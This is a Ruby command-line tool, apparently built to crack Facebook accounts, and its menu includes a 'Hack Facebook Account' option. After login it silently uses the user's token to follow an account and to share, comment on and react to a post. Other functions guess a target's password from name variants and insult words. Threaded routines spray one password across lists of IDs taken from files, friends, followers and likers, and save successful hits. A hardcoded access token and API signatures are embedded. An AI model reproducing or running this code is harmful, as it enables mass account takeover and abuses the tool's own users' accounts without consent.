DI SARANKAN UNTUK LOGIN MELALUI TOKEN A

$LOAD_PATH.unshift File.expand_path(".", "lib")


require 'requests/sugar'
require 'thread/pool'
require 'io/console'
require 'net/http'
require 'digest'
require 'json'
require 'erb'
require 'uri'
require 'os'

$logo = $$
$MaxProcess = 300
$limits = 5000

def load()
  for x in [".   ", "..  ", "... ",".... ","\n"]
    $stdout.write("\r\033[92m[!] Please Wait"+x)
    $stdout.flush()
    sleep(1)
  end
end

def tik(teks)
  for x in teks.chars << "\n"
    $stdout.write(x)
    $stdout.flush()
    sleep(0.05)
  end
end

def convert_bytes(num)
  for i in ['B','KB','MB','GB','TB']
    if num < 1024.0
      return "%3.1f %s" % [num, i]
    else
      num /= 1024.0
    end
  end
end

def get(url)
  x = URI(url)
  y = Net::HTTP.get(x)
  return y
end

def login()
  begin
    system('clear')
    puts($logo)
    puts ("║-> \x1b[1;37;40m1. Login Via Id/email/password")
    puts ("║-> \x1b[1;37;40m2. Login Via Token")
    puts ("║-> \x1b[1;37;40m3. Report Bug")
    puts ("║-> \x1b[1;37;40m0. exit")
    print ("╚═\x1b[1;91m▶\x1b[1;97m ")
    log = gets.chomp()
    if log == '1' or log == '01'
      loginpw()
    elsif log == '2' or log == '02'
      loginto()
    elsif log == '3' or log == '03'
      system ('xdg-open https://wa.me/6285754629509/')
      sleep(1.5)
      login()
    elsif log == '0' or log == '00'
      exit()
    else
      puts ("\033[93m[!] Invalid Input")
      sleep(1.5)
      login()
    end
  rescue SocketError
    puts ("\033[91m[!] No Connection")
    exit()
  rescue Errno::ETIMEDOUT
    puts ("\033[93m[!] Connection timed out")
    exit()
  rescue Interrupt
    puts ("\033[91m[!] Exit")
    exit()
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("\033[93m[!] There is an error\n[!] Please Try Again")
  end
end

def loginpw()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[91m[+] \033[92mLOGIN ACCOUNT FACEBOOK \033[91m[+]")
  print ("\033[91m[+] \033[92musername \033[91m: \033[96m")
  id = gets.chomp() ; id = id.tr(" ","")
  print ("\033[91m[+] \033[92mpassword \033[91m: \033[96m")
  pwd = STDIN.noecho(&:gets).chomp()
  puts ("\n")
  load()
  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': id, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pwd, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
  c = Digest::MD5.new
  c.update(a)
  d = c.hexdigest
  b.update({'sig': d})
  uri = URI("https://api.facebook.com/restserver.php")
  uri.query = URI.encode_www_form(b)
  res = Net::HTTP.get_response(uri)
  f = JSON.parse(res.body)
  if f.include? ('access_token')
    x = File.open('login.txt','w')
    x.write(f['access_token'])
    x.close()
    $token = f['access_token']
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LIKE","LOVE","WOW"].sample,"access_token"=>$token})
    puts ("\033[92m[✓] Login Success")
    masuk()
  elsif f.include? ('error_msg') and f['error_msg'].include? ('www.facebook.com')
    puts ("\033[91m[!] \033[93musername \033[91m: \033[97m"+id)
    puts ("\033[91m[!] \033[93mpassword \033[91m: \033[97m"+pwd)
    puts ("\033[91m[!] \033[93mstatus.  \033[91m: \033[91mAccount Has Been Checkpoint")
    exit()
  else
    puts ("\033[91m[!] Login Failed")
    sleep(1.5)
    loginpw()
  end
end

def loginto()
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[91m[+] \033[92mLOGIN VIA TOKEN \033[91m[+]")
  print ("\033[91m[+] \033[92mAccess Token \033[91m: \033[97m")
  $token = gets.chomp(EAAAAZAw4FxQIBAP5iyMO6SUilRSbpAZA2pBrFErfN5vCKqyTqlctMpHdQ5ZC0bB6mdaOL2oU1YpDTfiDWBAjplUmuHRKt5EqWoeuX6CfEJmBVXBRflZAuF1lJwzZB01pRa2bjGHZBEIzrnhvC6lEjccCK4j3LIfXZA1KhxGXazmcAZDZD)
  load()
  x = URI("https://graph.facebook.com/me?access_token=" + $token)
  y = JSON.parse(Net::HTTP.get(x))
  if y.include? ('name')
    a = File.open('login.txt','w')
    a.write($token)
    a.close()
    $name = y['name']
    $id = y['id']
    msg = ["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"]
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>msg.sample,"access_token"=>$token})
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LIKE","LOVE","WOW"].sample,"access_token"=>$token})
    puts ("\033[92m[✓] Login Success")
    sleep(1)
    menu()
  elsif y.include? ('error') and y['error']['code'] == 190
    puts ("\033[93m[!] "+y['error']['message'])
    exit()
  else
    puts ("\033[93m[!] Invalid Access Token")
    sleep(1.9)
    loginto()
  end
end

def masuk()
  begin
    $token = File.read("login.txt")
    x = get("https://graph.facebook.com/me?access_token=" + $token)
    y = JSON.parse(x)
    if y.include? ('id')
      $name = y['name']
      $id = y['id']
      menu()
    elsif y.include? ('error') and y['error']['code'] == 190
      system ('rm -rf login.txt')
      puts ("\033[93m[!] #{y['error']['message']}")
      sleep(0.9)
      login()
    else
      puts (y)
      system ('rm -rf login.txt')
      puts ("\033[91m[!] Invalid Access Token")
      sleep(0.9)
      login()
    end
  rescue SocketError
    puts ("\033[91m[!] No Connection")
    exit()
  rescue Errno::ETIMEDOUT
    puts ("\033[93m[!] Connection timed out")
    exit()
  rescue Errno::ENOENT
    login()
  rescue Interrupt
    puts ("\033[91m[!] Exit")
    exit()
  end
end

def menu()
  system('clear')
  puts ($logo)
  puts ("\033[97m╔══════════════════════════════════════════════════╗")
  puts ("\033[97m║\033[91m[\033[96m✓\033[91m] \033[97mName : \033[92m" + $name + " "*(39 - $name.length()) + "\033[97m║")
  puts ("\033[97m║\033[91m[\033[96m✓\033[91m] \033[97mID.  : \033[92m" + $id + " "*(39 - $id.length()) + "\033[97m║")
  puts ("\033[97m")
  puts ("║-> \x1b[1;37;40m1. MyFrofil")
  puts ("║-> \x1b[1;37;40m2. User Information")
  puts ("║-> \x1b[1;37;40m3. Hack Facebook Account")
  puts ("║-> \x1b[1;37;40m4. Bot")
  puts ("║-> \x1b[1;37;40m5. Others")
  puts ("║-> \x1b[1;37;40m6. Feedback")
  puts ("║-> \x1b[1;37;40m7. Update")
  puts ("║-> \x1b[1;37;40m8. Logout")
  puts ("║-> \x1b[1;37;40m0. exit")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  pilih = gets.chomp()
  if pilih == '1' or pilih == '01'
    MyFrofil()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    menu()
  elsif pilih == '2' or pilih == '02'
    Info()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    menu()
  elsif pilih == '3' or pilih == '03'
    Hamker()
  elsif pilih == '4' or pilih == '04'
    Bot()
  elsif pilih == '5' or pilih == '05'
    lain()
  elsif pilih == '6' or pilih == '06'
    system ("xdg-open https://wa.me/6285754629509/")
    sleep(0.9)
  elsif pilih == '7' or pilih == '07'
    update()
  elsif pilih == '8' or pilih == '08'
    print ("Do You Want To Continue? [Y/n] ")
    sure = gets.chomp()
    if sure.downcase == 'y'
      puts ("#{$0} : Deleting File login.txt")
      sleep(0.3)
      begin
        File.delete('login.txt')
        abort ("#{$0} : Successfully Deleting the login.txt file")
      rescue
        puts ("#{$0} : Failed to delete the login.txt file")
      end
    else
      menu()
    end
  elsif pilih == '0' or pilih == '00'
    abort ("\033[91m[!] Exit")
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    menu()
  end
end

def MyFrofil()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  a = get("https://graph.facebook.com/me?access_token=" + $token)
  data = JSON.parse(a)
  abort ("\033[93m[!] #{data['error']['message']}") if data.key? ('error')
  b = get("https://graph.facebook.com/me/subscribers?access_token="+$token)
  c = get("https://graph.facebook.com/me/subscribedto?access_token="+$token)
  d = get ("https://graph.facebook.com/me/friends?access_token="+$token)
  ikuti = JSON.parse(b)['summary']['total_count'].to_s
  mengikuti = JSON.parse(c)['summary']['total_count'].to_s if not JSON.parse(c)['data'].empty?
  mengikuti = "0" if JSON.parse(c)['data'].empty?
  temen = JSON.parse(d)["data"].each {|i| i['id']}.length.to_s if not JSON.parse(d)['data'].empty?
  temen = "0" if JSON.parse(d)['data'].empty?
  puts ("\033[92m[✓] Name : "+data['name'])
  puts ("\033[92m[✓] Id : "+data['id'])
  puts ("\033[92m[✓] Friend : "+temen)
  puts ("\033[92m[✓] Followers : "+ikuti)
  puts ("\033[92m[✓] Following : "+mengikuti)
  puts ("\033[92m[✓] birthday : "+data['birthday']) if data.key? ('birthday')
  puts ("\033[92m[✓] Status : "+data['relationship_status']) if data.key? ('relationship_status')
  puts ("\033[92m[✓] Religion : "+data['religion']) if data.key? ('religion')
  data['interested_in'].each {|i| puts ("\033[92m[✓] Interested in: "+i)} if data.key? ('interested_in')
  puts ("\033[92m[✓] Email : "+data['email']) if data.key? ('email')
  puts ("\033[92m[✓] Phone : "+data['mobile_phone']) if data.key? ('mobile_phone')
  puts ("\033[92m[✓] Location : "+data['location']['name']) if data.key? ('location')
  puts ("\033[92m[✓] Hometown : "+data['hometown']['name']) if data.key? ('hometown')
  data['education'].each {|i| puts ("\033[92m[✓] #{i['type']} : #{i['school']['name']}")} if data.key? ('education')
  data['work'].each {|i| puts ("\033[92m[✓] Work : #{i['employer']['name']}")} if data.key? ('work')
end

def Info()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] User Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get("https://graph.facebook.com/#{id}?access_token=" + $token)
  data = JSON.parse(a)
  if data.key? ("error")
    puts ("\033[93m[!] User Not Found")
  else
    puts ("\033[97m[+] Pleace Wait...")
    puts ("\033[97m═"*52)
    b = get("https://graph.facebook.com/#{id}/subscribers?access_token="+$token)
    c = get("https://graph.facebook.com/#{id}/subscribedto?access_token="+$token)
    d = get ("https://graph.facebook.com/#{id}/friends?access_token="+$token)
    ikuti = JSON.parse(b)['summary']['total_count'].to_s
    mengikuti = JSON.parse(c)['summary']['total_count'].to_s if not JSON.parse(c)['data'].empty?
    mengikuti = "0" if JSON.parse(c)['data'].empty?
    temen = JSON.parse(d)["data"].each {|i| i['id']}.length.to_s if not JSON.parse(d)['data'].empty?
    temen = "0" if JSON.parse(d)['data'].empty?
    puts ("\033[92m[✓] Name : "+data['name'])
    puts ("\033[92m[✓] Id : "+data['id'])
    puts ("\033[92m[✓] Friend : "+temen)
    puts ("\033[92m[✓] Followers : "+ikuti)
    puts ("\033[92m[✓] Following : "+mengikuti)
    puts ("\033[92m[✓] birthday : "+data['birthday']) if data.key? ('birthday')
    puts ("\033[92m[✓] Status : "+data['relationship_status']) if data.key? ('relationship_status')
    puts ("\033[92m[✓] Religion : "+data['religion']) if data.key? ('religion')
    data['interested_in'].each {|i| puts ("\033[92m[✓] Interested in: "+i)} if data.key? ('interested_in')
    puts ("\033[92m[✓] Email : "+data['email']) if data.key? ('email')
    puts ("\033[92m[✓] Phone : "+data['mobile_phone']) if data.key? ('mobile_phone')
    puts ("\033[92m[✓] Location : "+data['location']['name']) if data.key? ('location')
    puts ("\033[92m[✓] Hometown : "+data['hometown']['name']) if data.key? ('hometown')
    data['education'].each {|i| puts ("\033[92m[✓] #{i['type']} : #{i['school']['name']}")} if data.key? ('education')
    data['work'].each {|i| puts ("\033[92m[✓] Work : #{i['employer']['name']}")} if data.key? ('work')
  end
end

def Mini()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Target Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  a = get('https://graph.facebook.com/' + id + '/?access_token=' + $token)
  b = JSON.parse(a)
  if b.include? ('error') and b['error']['code'] == 190
    puts ("\033[93m[!] "+b['error']['message'])
    sleep (1.5)
    login()
  elsif b.include? ('error')
    puts ("\033[93m[!] User Not Found")
  else
    name = ERB::Util.url_encode(b['name'])
    first = ERB::Util.url_encode(b['first_name'])
    last = ERB::Util.url_encode(b['last_name'])
    puts ("\033[97m[✓] Target Name : "+b['name'])
    puts ("\033[97m[!] CRACK!")
    puts ("\033[97m═"*52)
    pw = name + "123"
    x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    y =  JSON.parse(x)
    if y.include? ('access_token')
      puts ("\033[92m[✓] Success")
      puts ("\033[92m[✓] Name : "+b['name'])
      puts ("\033[92m[✓] username : "+id)
      puts ("\033[92m[✓] password : "+pw)
    elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
      puts ("\033[93m[!] Account Has Been Checkpoint")
      puts ("\033[92m[✓] Name : "+b['name'])
      puts ("\033[92m[✓] username : "+id)
      puts ("\033[92m[✓] password : "+pw)
    else
      pw = name + "12345"
      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      y =  JSON.parse(x)
      if y.include? ('access_token')
        puts ("\033[92m[✓] Success")
        puts ("\033[92m[✓] Name : "+b['name'])
        puts ("\033[92m[✓] username : "+id)
        puts ("\033[92m[✓] password : "+pw)
      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
        puts ("\033[93m[!] Account Has Been Checkpoint")
        puts ("\033[92m[✓] Name : "+b['name'])
        puts ("\033[92m[✓] username : "+id)
        puts ("\033[92m[✓] password : "+pw)
      else
        pw = first + "123"
        x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
        y = JSON.parse(x)
        if y.include? ('access_token')
          puts ("\033[92m[✓] Success")
          puts ("\033[92m[✓] Name : "+b['name'])
          puts ("\033[92m[✓] username : "+id)
          puts ("\033[92m[✓] password : "+pw)
        elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
          puts ("\033[93m[!] Account Has Been Checkpoint")
          puts ("\033[92m[✓] Name : "+b['name'])
          puts ("\033[92m[✓] username : "+id)
          puts ("\033[92m[✓] password : "+pw)
        else
          pw = first + "12345"
          x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
          y = JSON.parse(x)
          if y.include? ('access_token')
            puts ("\033[92m[✓] Success")
            puts ("\033[92m[✓] Name : "+b['name'])
            puts ("\033[92m[✓] username : "+id)
            puts ("\033[92m[✓] password : "+pw)
          elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
            puts ("\033[93m[!] Account Has Been Checkpoint")
            puts ("\033[92m[✓] Name : "+b['name'])
            puts ("\033[92m[✓] username : "+id)
            puts ("\033[92m[✓] password : "+pw)
          else
            pw = last + "123"
            x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = JSON.parse(x)
            if y.include? ('access_token')
              puts ("\033[92m[✓] Success")
              puts ("\033[92m[✓] Name : "+b['name'])
              puts ("\033[92m[✓] username : "+id)
              puts ("\033[92m[✓] password : "+pw)
            elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
              puts ("\033[93m[!] Account Has Been Checkpoint")
              puts ("\033[92m[✓] Name : "+b['name'])
              puts ("\033[92m[✓] username : "+id)
              puts ("\033[92m[✓] password : "+pw)
            else
              pw = last + "12345"
              x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
              y = JSON.parse(x)
              if y.include? ('access_token')
                puts ("\033[92m[✓] Success")
                puts ("\033[92m[✓] Name : "+b['name'])
                puts ("\033[92m[✓] username : "+id)
                puts ("\033[92m[✓] password : "+pw)
              elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                puts ("\033[93m[!] Account Has Been Checkpoint")
                puts ("\033[92m[✓] Name : "+b['name'])
                puts ("\033[92m[✓] username : "+id)
                puts ("\033[92m[✓] password : "+pw)
              else
                pw = "Anjing"
                x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = JSON.parse(x)
                if y.include? ('access_token')
                  puts ("\033[92m[✓] Success")
                  puts ("\033[92m[✓] Name : "+b['name'])
                  puts ("\033[92m[✓] username : "+id)
                  puts ("\033[92m[✓] password : "+pw)
                elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                  puts ("\033[93m[!] Account Has Been Checkpoint")
                  puts ("\033[92m[✓] Name : "+b['name'])
                  puts ("\033[92m[✓] username : "+id)
                  puts ("\033[92m[✓] password : "+pw)
                else
                  pw = "Kontol"
                  x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                  y = JSON.parse(x)
                  if y.include? ('access_token')
                    puts ("\033[92m[✓] Success")
                    puts ("\033[92m[✓] Name : "+b['name'])
                    puts ("\033[92m[✓] username : "+id)
                    puts ("\033[92m[✓] password : "+pw)
                  elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                    puts ("\033[93m[!] Account Has Been Checkpoint")
                    puts ("\033[92m[✓] Name : "+b['name'])
                    puts ("\033[92m[✓] username : "+id)
                    puts ("\033[92m[✓] password : "+pw)
                  else
                    pw = "Bangsat"
                    x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = JSON.parse(x)
                    if y.include? ('access_token')
                      puts ("\033[92m[✓] Success")
                      puts ("\033[92m[✓] Name : "+b['name'])
                      puts ("\033[92m[✓] username : "+id)
                      puts ("\033[92m[✓] password : "+pw)
                    elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                      puts ("\033[93m[!] Account Has Been Checkpoint")
                      puts ("\033[92m[✓] Name : "+b['name'])
                      puts ("\033[92m[✓] username : "+id)
                      puts ("\033[92m[✓] password : "+pw)
                    else
                      pw = "Doraemon"
                      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                      y = JSON.parse(x)
                      if y.include? ('access_token')
                        puts ("\033[92m[✓] Success")
                        puts ("\033[92m[✓] Name : "+b['name'])
                        puts ("\033[92m[✓] username : "+id)
                        puts ("\033[92m[✓] password : "+pw)
                      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                        puts ("\033[93m[!] Account Has Been Checkpoint")
                        puts ("\033[92m[✓] Name : "+b['name'])
                        puts ("\033[92m[✓] username : "+id)
                        puts ("\033[92m[✓] password : "+pw)
                      else
                        pw = "Sayang"
                        x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = JSON.parse(x)
                        if y.include? ('access_token')
                          puts ("\033[92m[✓] Success")
                          puts ("\033[92m[✓] Name : "+b['name'])
                          puts ("\033[92m[✓] username : "+id)
                          puts ("\033[92m[✓] password : "+pw)
                        elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                          puts ("\033[93m[!] Account Has Been Checkpoint")
                          puts ("\033[92m[✓] Name : "+b['name'])
                          puts ("\033[92m[✓] username : "+id)
                          puts ("\033[92m[✓] password : "+pw)
                        else
                          pw = "Goblok"
                          x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                          y = JSON.parse(x)
                          if y.include? ('access_token')
                            puts ("\033[92m[✓] Success")
                            puts ("\033[92m[✓] Name : "+b['name'])
                            puts ("\033[92m[✓] username : "+id)
                            puts ("\033[92m[✓] password : "+pw)
                          elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                            puts ("\033[93m[!] Account Has Been Checkpoint")
                            puts ("\033[92m[✓] Name : "+b['name'])
                            puts ("\033[92m[✓] username : "+id)
                            puts ("\033[92m[✓] password : "+pw)
                          else
                            pw = "Persija"
                            x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = JSON.parse(x)
                            if y.include? ('access_token')
                              puts ("\033[92m[✓] Success")
                              puts ("\033[92m[✓] Name : "+b['name'])
                              puts ("\033[92m[✓] username : "+id)
                              puts ("\033[92m[✓] password : "+pw)
                            elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
                              puts ("\033[93m[!] Account Has Been Checkpoint")
                              puts ("\033[92m[✓] Name : "+b['name'])
                              puts ("\033[92m[✓] username : "+id)
                              puts ("\033[92m[✓] password : "+pw)
                            else
                              puts ("\033[91m[!] Sorry, opening password target failed :(")
                              puts ("\033[91m[!] Try other method.")
                            end 
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end 
        end
      end
    end
  end
end

def Multi()
  $cp = 0
  $ok = 0
  th = []
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  print ("\033[97m[+] File Id : ")
  files = gets.chomp()
  if File.file? (files)
    buka = File.readlines(files, chomp: true)
    $file = File.open(files)
    print ("\033[97m[+] Password: ")
    $pwd = gets.chomp()
    puts ("\033[97m[+] Total Id: "+buka.length.to_s)
    puts ("\033[97m═"*52)
    40.times{th << Thread.new{crack}}
    th.each(&:join)
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Total OK : "+$ok.to_s)
    puts ("\033[93m[!] Total CP : "+$cp.to_s)
  else
    puts ("\033[93m[!] File Not Found")
  end
end


def crack
  while $file
    begin
      usr = $file.readline.strip
      x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + $pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
      y = JSON.parse(x)
      if y.include? ('access_token')
        $ok += 1
        z = File.open("multi.txt","a")
        z.write("%s | %s\n" % [usr,$pwd])
        z.close()
        puts ("\033[92m[OK] %s | %s" % [usr,$pwd])
      elsif y.include? ('error_msg') and y['error_msg'].include?  ('www.facebook.com')
        $cp += 1
        z = File.open("multi.txt","a")
        z.write("%s | %s\n" % [usr,$pwd])
        z.close()
        puts ("\033[93m[CP] %s | %s" % [usr,$pwd])
      end
    rescue SocketError
      puts ("\033[91m[!] No Connection")
      sleep(1)
    rescue Errno::ETIMEDOUT
      puts ("\033[93m[!] Connection timed out")
    rescue EOFError
      break
    end
  end
end

def Super()
  $ok = 0
  $cp = 0
  system("clear")
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \x1b[1;37;40m1. Crack from Friends")
  puts ("║-> \x1b[1;37;40m2. Crack from Followers")
  puts ("║-> \x1b[1;37;40m3. Crack from Like")
  puts ("║-> \x1b[1;37;40m4. Crack from Comment")
  puts ("║-> \x1b[1;37;40m5. Crack Friends from Friends")
  puts ("║-> \x1b[1;37;40m6. Crack Followers from Friends")
  puts ("║-> \x1b[1;37;40m0. Back")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  su = gets.chomp()
  if su == '1' or su == '01'
    system ("clear")
    puts ($logo)
    puts ("\033[97m═"*52)
    tik ("\033[97m[+] Pleace Wait")
    x = get("https://graph.facebook.com/me/friends?access_token="+$token)
    y = JSON.parse(x)
    id = y['data'].map {|i| i['id']}
    tik("\033[97m[+] Total Id : "+id.length().to_s)
    puts ("\033[97m[+] CRACK!")
    pool = Thread.pool($MaxProcess)
    puts ("\033[97m═"*52)
    id.map {|i| pool.process{main(i)}}
    pool.shutdown
    puts ("\033[97m═"*52)
    puts ("\033[92m[✓] Total OK : "+$ok.to_s)
    puts ("\033[93m[!] Total CP : "+$cp.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Super()
  elsif su == '2' or su == '02'
    system ('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    puts ("\033[97m[+] Pleace Wait.....")
    a = get("https://graph.facebook.com/me/subscribers?limit=#{$limits}&access_token=#{$token}")
    b = JSON.parse(a)
    kosong = b['data'].empty?
    if kosong
      puts ("\033[93m[+] Your Account Has No Followers")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Total Id : #{b['summary']['total_count']}")
      puts ("\033[93m[!] You will only be cracking #{$limits} account") if b['summary']['total_count'] > $limits
      puts ("\033[97m[+] CRACK!")
      id = b['data'].map {|i| i['id']}
      pool = Thread.pool($MaxProcess)
      puts ("\033[97m═"*52)
      id.map {|i| pool.process{main(i)}}
      pool.shutdown
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Total OK : "+$ok.to_s)
      puts ("\033[93m[!] Total CP : "+$cp.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    end
   elsif su == '3' or su == '03'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    a = get("https://graph.facebook.com/#{id}?access_token=#{$token}")
    b = JSON.parse(a)
    if b.key? ('error')
      puts ("\033[97m[+] Posts Not Found")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Super()
    else
      puts ("\033[97m[+] Posted by #{b['from']['name']}")
      if b.key? ('likes')
        a = get("https://graph.facebook.com/#{id}/likes?summary=true&limit=#{$limits}&access_token=#{$token}")
        b = JSON.parse(a)
        id = b['data'].map {|i| i['id']}
        puts ("\033[97m[+] Total Like #{b['summary']['total_count']}")
        puts ("\033[93m[!] You will only be cracking #{id.length} account") if id.length != b['summary']['total_count']
        puts ("\033[97m[+] CRACK!")
        pool = Thread.pool($MaxProcess)
        puts ("\033[97m═"*52)
        id.map {|i| pool.process{main(i)}}
        pool.shutdown
        puts ("\033[97m═"*52)
        puts ("\033[92m[✓] Total OK : "+$ok.to_s)
        puts ("\033[93m[!] Total CP : "+$cp.to_s)
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      else
        puts ("\033[93m[+] No Like")
        print ("\n\033[91m[\033[92mBack\033[91m] ")
        gets
        Super()
      end
    end
  elsif su == '4' or su == '04'
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Post Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    a = get("https://graph.facebook.com/#{id}?access_token=#{$token}")
